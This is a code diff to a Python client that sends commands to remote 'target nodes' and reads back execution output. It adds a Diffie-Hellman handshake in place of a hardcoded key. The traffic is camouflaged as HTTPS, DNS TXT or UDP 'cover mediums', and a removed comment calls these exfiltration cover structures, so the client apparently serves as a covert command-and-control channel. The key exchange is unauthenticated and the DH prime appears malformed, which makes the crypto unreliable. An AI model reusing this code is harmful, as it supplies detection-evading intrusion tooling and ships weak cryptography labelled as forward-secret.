@@ -8,11 +8,12 @@ import hashlib
 from obfuscation_matrix import TrafficObfuscator
 
 CONFIG_PATH = "mesh_config.json"
+DH_PRIME = 0xFFFFFFFFFFFFFFFFC90FFAA7ED91923641216727E282D639171164B826770944A66616A6635B494499FA695630F27A9757434353051A6FFD96B8799337765771281F229188EA671C9F65D55247716509352B51410300250377B7928509755B1C661CE12674975422E0A1B1605A60308917044893844147432180F551512307B28B3154562A735B5A93D6B2FEB1350148E06A1435801741757D225D45667F9351A3C4E02B6D44D5C5581D05125597
+DH_GENERATOR = 2
 
 class SecureSessionChannel:
     def __init__(self):
         self.sock = None
-        self.session_key = hashlib.sha256(b"SovereignMeshDefaultSecretTokenKeyRing").digest()
         self.active_gateway = None
         self.obfuscator = TrafficObfuscator()
 
@@ -45,12 +46,12 @@ class SecureSessionChannel:
             decoded.append(low_nibble | (high_nibble << 4))
         return bytes(decoded)
 
-    def _crypt_stream(self, data_bytes: bytes, iv: bytes) -> bytes:
+    def _crypt_stream(self, data_bytes: bytes, iv: bytes, target_key: bytes) -> bytes:
         out = bytearray()
         counter = 0
         for i in range(0, len(data_bytes), 32):
             block = data_bytes[i:i+32]
-            keystream_block = hmac.new(self.session_key, iv + counter.to_bytes(4, byteorder='big'), hashlib.sha256).digest()
+            keystream_block = hmac.new(target_key, iv + counter.to_bytes(4, byteorder='big'), hashlib.sha256).digest()
             for b, k in zip(block, keystream_block): out.append(b ^ k)
             counter += 1
         return bytes(out)
@@ -67,7 +68,7 @@ class SecureSessionChannel:
             if node_id in routes:
                 try:
                     self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    self.sock.settimeout(2.0)
+                    self.sock.settimeout(3.0)
                     self.sock.connect(("127.0.0.1", routes[node_id]))
                     self.active_gateway = node_id
                     return
@@ -76,62 +77,86 @@ class SecureSessionChannel:
         raise RuntimeError("CRITICAL BLACKOUT: All accessible gateway lines are offline.")
 
     def transmit_command_routed(self, target_node: str, command_id: str) -> dict:
-        try:
-            with open(CONFIG_PATH, "r") as f:
-                config = json.load(f)
-            payload_size = config.get("GLOBAL_SETTINGS", {}).get("fixed_payload_size", 512)
-        except Exception:
-            payload_size = 512
+        # 1. GENERATE EPHEMERAL INLINE KEY PAIR
+        cl_private = int.from_bytes(os.urandom(32), byteorder='big')
+        cl_public = pow(DH_GENERATOR, cl_private, DH_PRIME)
+        cl_public_bytes = str(cl_public).encode('utf-8')
 
+        # 2. EXECUTE EXPLICIT CONTROL PLANE HANDSHAKE ROUTE
+        # Packet Envelope Layout: Target Node + DH Key Length + Public Key String
+        kex_init_envelope = {
+            "target_node": target_node,
+            "kex_step": "INIT",
+            "dh_public": cl_public_bytes.decode('utf-8')
+        }
+        
+        kex_fec = self.encode_fec_bytes(json.dumps(kex_init_envelope).encode('utf-8'))
+        self.sock.sendall(struct.pack("!I", len(kex_fec)) + bytes(kex_fec))
+
+        # Read Server Public Key Response
+        resp_header = self.sock.recv(4)
+        if not resp_header or len(resp_header) < 4:
+            raise RuntimeError("Truncated handshake stream response.")
+        server_fec_len = struct.unpack("!I", resp_header)[0]
+        raw_srv_fec = self.sock.recv(server_fec_len)
+        
+        server_envelope = json.loads(self.decode_and_heal_fec_bytes(raw_srv_fec).decode('utf-8'))
+        server_dh_public = int(server_envelope.get("dh_public", 0))
+
+        # 3. DERIVE DYNAMIC SYMMETRIC SESSION KEY FOR PERFECT FORWARD SECRECY
+        shared_secret_int = pow(server_dh_public, cl_private, DH_PRIME)
+        shared_bytes = shared_secret_int.to_bytes((shared_secret_int.bit_length() + 7) // 8, byteorder='big')
+        ephemeral_session_key = hashlib.sha256(shared_bytes).digest()
+
+        # 4. ENCRYPT AND DISPATCH DATA LAYER SEGMENT
         payload = {"command_id": command_id, "params": {}, "timestamp": time.time()}
         raw_payload_bytes = json.dumps(payload, sort_keys=True).encode('utf-8')
         
         padded_buffer = bytearray()
         padded_buffer.extend(len(raw_payload_bytes).to_bytes(4, byteorder='big'))
         padded_buffer.extend(raw_payload_bytes)
-        padding_needed = payload_size - len(padded_buffer)
+        padding_needed = 512 - len(padded_buffer)
         if padding_needed > 0: padded_buffer.extend(os.urandom(padding_needed))
             
         iv = os.urandom(16)
-        ciphertext = self._crypt_stream(bytes(padded_buffer), iv)
+        ciphertext = self._crypt_stream(bytes(padded_buffer), iv, ephemeral_session_key)
         encrypted_data_block = {"iv": iv.hex(), "ciphertext": ciphertext.hex()}
         
-        canonical_target = json.dumps(encrypted_data_block, sort_keys=True)
-        signature = hmac.new(self.session_key, canonical_target.encode('utf-8'), hashlib.sha256).hexdigest()
+        signature = hmac.new(ephemeral_session_key, json.dumps(encrypted_data_block, sort_keys=True).encode('utf-8'), hashlib.sha256).hexdigest()
         
-        inner_envelope = {"version": "1.0", "signature": signature, "encrypted_data": encrypted_data_block}
-        routing_envelope = {"target_node": target_node, "inner_envelope": inner_envelope}
-        
-        client_json_bytes = json.dumps(routing_envelope).encode('utf-8')
-        
-        # CHOOSE OBFUSCATION VECTOR: Dynamically rotate exfiltration cover structures
+        data_envelope = {
+            "target_node": target_node,
+            "kex_step": "DATA",
+            "signature": signature,
+            "encrypted_data": encrypted_data_block
+        }
+
+        # Apply polymorphic obfuscator structures to data envelope
+        client_json_bytes = json.dumps(data_envelope).encode('utf-8')
         chosen_medium = ["HTTPS_SIM", "DNS_TXT", "UDP_BLAST"][int(time.time()) % 3]
         obfuscated_package = self.obfuscator.camouflage_fragment(client_json_bytes, chosen_medium)
-        print(f"[*] Camouflage Applied: Encapsulated over structural vector medium [{chosen_medium}]")
+        print(f"[*] PFS Session Key Aligned. Routing command via cover medium: [{chosen_medium}]")
         
         fec_bytes = self.encode_fec_bytes(json.dumps(obfuscated_package).encode('utf-8'))
-            
-        header = struct.pack("!I", len(fec_bytes))
-        self.sock.sendall(header + bytes(fec_bytes))
+        self.sock.sendall(struct.pack("!I", len(fec_bytes)) + bytes(fec_bytes))
         
-        resp_header = self.sock.recv(4096)
-        if not resp_header or len(resp_header) < 4:
+        # Read final execution output data back from target machine
+        data_resp_header = self.sock.recv(4)
+        if not data_resp_header or len(data_resp_header) < 4:
             raise RuntimeError("Truncated response payload block stream.")
             
-        server_payload_length = struct.unpack("!I", resp_header[0:4])[0]
-        raw_srv_fec = resp_header[4:4+server_payload_length]
+        server_payload_length = struct.unpack("!I", data_resp_header)[0]
+        raw_srv_data_fec = self.sock.recv(server_payload_length)
         
-        healed_srv_bytes = self.decode_and_heal_fec_bytes(raw_srv_fec)
-        server_envelope = json.loads(healed_srv_bytes.decode('utf-8'))
+        server_data_envelope = json.loads(self.decode_and_heal_fec_bytes(raw_srv_data_fec).decode('utf-8'))
+        server_enc_block = server_data_envelope.get("encrypted_data")
         
-        server_enc_block = server_envelope.get("encrypted_data")
-        canonical_resp_str = json.dumps(server_enc_block, sort_keys=True)
-        if not hmac.compare_digest(hmac.new(self.session_key, canonical_resp_str.encode('utf-8'), hashlib.sha256).hexdigest(), server_envelope.get("signature", "")):
-            raise RuntimeError("Outer packet MAC validation anomaly.")
+        if not hmac.compare_digest(hmac.new(ephemeral_session_key, json.dumps(server_enc_block, sort_keys=True).encode('utf-8'), hashlib.sha256).hexdigest(), server_data_envelope.get("signature", "")):
+            raise RuntimeError("PFS Session key integrity mismatch on response stream.")
             
         srv_iv = bytes.fromhex(server_enc_block["iv"])
         srv_ciphertext = bytes.fromhex(server_enc_block["ciphertext"])
-        decrypted_bytes = self._crypt_stream(srv_ciphertext, srv_iv)
+        decrypted_bytes = self._crypt_stream(srv_ciphertext, srv_iv, ephemeral_session_key)
         
         data_len = int.from_bytes(decrypted_bytes[0:4], byteorder='big')
         return json.loads(decrypted_bytes[4:4+data_len].decode('utf-8'))
